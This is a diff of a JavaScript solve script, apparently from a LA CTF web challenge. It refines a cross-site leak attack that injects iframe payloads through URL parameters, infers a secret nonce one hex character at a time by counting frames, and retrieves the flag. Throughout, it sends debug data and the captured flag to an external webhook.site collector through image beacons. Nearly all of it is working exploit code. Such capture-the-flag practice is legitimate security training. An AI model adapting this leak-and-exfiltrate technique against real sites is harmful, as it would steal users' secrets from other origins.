@@ -5,21 +5,21 @@
 var CHALL = 'https://notes.chall.lac.tf';
 var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
 var HEX = '0123456789abcdef';
+var ADS = 'https://ads.chall.lac.tf';
 
 function ping(msg) { new Image().src = WH + '?' + encodeURIComponent(msg); }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-ping('v3_loaded');
+ping('v4_loaded');
 
 async function testPosition(prefix) {
   var iframes = [];
   for (var i = 0; i < 16; i++) {
     var c = HEX[i];
-    // Inject srcdoc attribute on ad iframes containing a nested <iframe>
-    // Ad iframes get srcdoc with nested iframe -> window[i].length = 1
-    // Note iframes have plain text srcdoc -> window[i].length = 0
+    // Nested iframe uses valid ads URL to satisfy frame-src CSP
+    var payload = '<iframe src=' + ADS + '/1.html></iframe>';
     var url = CHALL + '/?srcdoc=x&referrerPolicy='
-      + encodeURIComponent('<iframe></iframe>')
+      + encodeURIComponent(payload)
       + '&search=' + encodeURIComponent(prefix + c);
     var f = document.createElement('iframe');
     f.src = url;
@@ -29,7 +29,7 @@ async function testPosition(prefix) {
     iframes.push(f);
   }
 
-  await sleep(3500);
+  await sleep(4000);
 
   var found = null;
   for (var j = 0; j < iframes.length; j++) {
@@ -40,16 +40,23 @@ async function testPosition(prefix) {
       var withChildren = 0;
       for (var k = 0; k < total; k++) {
         try {
-          if (f.contentWindow[k].length > 0) withChildren++;
-        } catch(e) {}
+          var cl = f.contentWindow[k].length;
+          if (cl > 0) withChildren++;
+        } catch(e) {
+          ping('innerErr_' + c + '_k=' + k + '_' + e.message);
+        }
       }
       var noteCount = total - withChildren;
-      if (noteCount > 0) {
+      if (noteCount > 0 && noteCount < total) {
+        // Only count as hit if SOME frames have children and SOME don't
         found = c;
         ping('HIT_c=' + c + '_t=' + total + '_ads=' + withChildren + '_notes=' + noteCount);
+      } else if (j === 0) {
+        // Debug: log first char's full details
+        ping('DBG_c=' + c + '_t=' + total + '_ads=' + withChildren + '_notes=' + noteCount);
       }
     } catch(e) {
-      ping('err_' + c + '_' + e.message);
+      ping('outerErr_' + c + '_' + e.message);
     }
     f.remove();
   }
@@ -62,7 +69,7 @@ async function solve() {
 
   for (var pos = 0; pos < 8; pos++) {
     var found = null;
-    for (var att = 0; att < 2 && found === null; att++) {
+    for (var att = 0; att < 3 && found === null; att++) {
       ping('pos=' + pos + '_att=' + att + '_pfx=' + nonce);
       found = await testPosition(nonce);
     }
@@ -81,7 +88,6 @@ async function solve() {
       var resp = await fetch(CHALL + '/guess?nonce=' + nonce);
       var flag = await resp.text();
       ping('FLAG=' + flag);
-      fetch(WH + '/flag=' + encodeURIComponent(flag));
     } catch(e) {
       ping('flagerr=' + e.message);
     }
